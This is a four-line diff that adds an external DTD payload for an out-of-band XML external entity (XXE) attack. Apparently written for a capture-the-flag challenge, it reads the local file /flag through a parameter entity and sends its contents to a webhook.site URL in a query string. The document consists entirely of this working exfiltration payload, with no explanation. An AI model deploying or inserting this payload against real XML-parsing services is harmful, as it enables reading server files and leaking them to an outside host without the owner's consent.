@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///flag">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://webhook.site/0fe065ab-d265-4de3-b286-1dea74d82983?Name=%file;'>">
+%eval;
+%exfiltrate;
